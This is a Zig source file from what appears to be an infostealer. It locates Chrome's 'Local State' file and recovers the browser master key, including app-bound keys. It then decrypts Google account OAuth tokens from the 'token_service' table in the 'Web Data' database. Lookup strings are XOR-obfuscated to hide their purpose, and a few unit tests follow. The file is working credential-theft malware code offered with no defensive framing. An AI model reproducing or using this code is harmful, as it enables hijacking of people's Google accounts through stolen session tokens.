const std = @import("std");
const sqLoot = @import("../parsers/sqLoot.zig");
const chrome_key = @import("../crypto/chrome_key.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");
const appbound = @import("appbound.zig");
const file_io = @import("../parsers/file_io.zig");
const hash = @import("../types/hash.zig");

const E = struct {
    pub const app_bound_key = hash.xorEncrypt("app_bound_encrypted_key");
    pub const appb_prefix = hash.xorEncrypt("APPB");
};

fn extractAppBoundKey(json: []const u8, out: *[256]u8) ?[]u8 {
    var key_str_buf: [E.app_bound_key.len]u8 = undefined;
    hash.xorDecrypt(&E.app_bound_key, &key_str_buf);

    const key_start = std.mem.indexOf(u8, json, &key_str_buf) orelse return null;
    const colon = std.mem.indexOfScalarPos(u8, json, key_start, '"') orelse return null;
    const val_start = std.mem.indexOfScalarPos(u8, json, colon + 1, '"') orelse return null;
    var val_end = val_start + 1;
    while (val_end < json.len) : (val_end += 1) {
        if (json[val_end] == '"') break;
    }
    if (val_end <= val_start + 1) return null;

    const b64_encoded = json[val_start + 1 .. val_end];
    var b64_buf: [512]u8 = undefined;
    const decoded = chrome_key.base64Decode(b64_encoded, &b64_buf) orelse return null;

    var appb_buf: [E.appb_prefix.len]u8 = undefined;
    hash.xorDecrypt(&E.appb_prefix, &appb_buf);

    const key_bytes = if (decoded.len > 4 and std.mem.eql(u8, decoded[0..4], &appb_buf)) decoded[4..] else decoded;
    const copy_len = @min(key_bytes.len, out.len);
    @memcpy(out[0..copy_len], key_bytes[0..copy_len]);
    return out[0..copy_len];
}

pub const GoogleToken = struct {
    gaia_id: []const u8,
    token: []const u8,
};

fn extractMasterKey(json: []const u8) ?[32]u8 {
    var b64_buf: [4096]u8 = undefined;
    var key_buf: [256]u8 = undefined;

    var appb_buf: [E.app_bound_key.len]u8 = undefined;
    hash.xorDecrypt(&E.app_bound_key, &appb_buf);

    const has_appbound = std.mem.indexOf(u8, json, &appb_buf) != null;

    const encrypted_key = chrome_key.extractEncryptedKey(json, &b64_buf) orelse {
        if (has_appbound) {
            const app_key = extractAppBoundKey(json, &key_buf) orelse return null;
            var mk: [32]u8 = undefined;
            @memset(&mk, 0);
            const cl = @min(app_key.len, mk.len);
            @memcpy(mk[0..cl], app_key[0..cl]);
            return mk;
        }
        return null;
    };

    const master_slice = chrome_crypto.decryptEncryptedKey(encrypted_key, &key_buf) orelse return null;
    var master_key: [32]u8 = undefined;
    @memset(&master_key, 0);
    const copy_len = @min(master_slice.len, master_key.len);
    @memcpy(master_key[0..copy_len], master_slice[0..copy_len]);
    return master_key;
}

fn findColumnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
    const cols = db.getColumnNames(table) catch return null;
    defer {
        for (cols) |c| allocator.free(c);
        allocator.free(cols);
    }
    for (cols, 0..) |col, i| {
        if (std.mem.eql(u8, col, name)) return i;
    }
    return null;
}

pub fn extractTokens(profile_path: []const u8, allocator: std.mem.Allocator) ![]GoogleToken {
    const local_state_path = try std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\..\\Local State" });
    defer allocator.free(local_state_path);

    const ls_mapped = file_io.MappedFile.open(local_state_path) orelse return &[_]GoogleToken{};
    defer ls_mapped.close();
    const json = ls_mapped.slice();

    const master_key = extractMasterKey(json) orelse return &[_]GoogleToken{};

    const wd_path = try std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Web Data" });
    defer allocator.free(wd_path);

    const mapped = file_io.MappedFile.open(wd_path) orelse return &[_]GoogleToken{};
    defer mapped.close();

    var db = sqLoot.SqliteDb.open(allocator, mapped.slice()) catch return &[_]GoogleToken{};
    defer db.deinit();

    const rows = db.readTable("token_service") catch return &[_]GoogleToken{};
    defer allocator.free(rows);

    const gaia_idx = findColumnIndex(&db, "token_service", "gaia_id", allocator) orelse return &[_]GoogleToken{};
    const token_idx = findColumnIndex(&db, "token_service", "encrypted_token", allocator) orelse return &[_]GoogleToken{};

    var tokens = std.ArrayList(GoogleToken).init(allocator);
    errdefer {
        for (tokens.items) |t| {
            allocator.free(t.gaia_id);
            allocator.free(t.token);
        }
        tokens.deinit();
    }

    for (rows) |row| {
        if (row.len <= @max(gaia_idx, token_idx)) continue;
        const gaia = if (row[gaia_idx] != .null and row[gaia_idx] == .text) row[gaia_idx].text else "";
        const enc = if (row[token_idx] != .null and row[token_idx] == .blob) row[token_idx].blob else continue;

        var decrypt_buf = try allocator.alloc(u8, enc.len);
        defer allocator.free(decrypt_buf);
        const decrypted = chrome_crypto.decryptPassword(enc, master_key, decrypt_buf) orelse continue;

        const gaia_dup = try allocator.dupe(u8, gaia);
        errdefer allocator.free(gaia_dup);
        const token_dup = try allocator.dupe(u8, decrypted);
        errdefer allocator.free(token_dup);

        try tokens.append(GoogleToken{
            .gaia_id = gaia_dup,
            .token = token_dup,
        });
    }

    return tokens.toOwnedSlice();
}

test "extractTokens returns empty for nonexistent path" {
    const result = try extractTokens("C:\\__nonexistent__", std.testing.allocator);
    defer {
        for (result) |t| {
            std.testing.allocator.free(t.gaia_id);
            std.testing.allocator.free(t.token);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "extractTokens handles empty profile directory" {
    const tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const tmp_path = tmp.dir.realpathAlloc(std.testing.allocator, ".") catch return;
    defer std.testing.allocator.free(tmp_path);
    const result = try extractTokens(tmp_path, std.testing.allocator);
    defer {
        for (result) |t| {
            std.testing.allocator.free(t.gaia_id);
            std.testing.allocator.free(t.token);
        }
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "GoogleToken struct is valid" {
    const token = GoogleToken{
        .gaia_id = "test_gaia",
        .token = "test_token",
    };
    try std.testing.expectEqualSlices(u8, "test_gaia", token.gaia_id);
    try std.testing.expectEqualSlices(u8, "test_token", token.token);
}

test "findColumnIndex returns null for nonexistent table" {
    var empty_data: [200]u8 = undefined;
    @memcpy(empty_data[0..16], sqLoot.SQLITE_MAGIC);
    std.mem.writeInt(u16, empty_data[16..18], 4096, .big);
    for (18..200) |i| empty_data[i] = 0;
    var db = sqLoot.SqliteDb.open(std.testing.allocator, &empty_data) catch return;
    defer db.deinit();
    const idx = findColumnIndex(&db, "no_such_table", "col", std.testing.allocator);
    try std.testing.expect(idx == null);
}
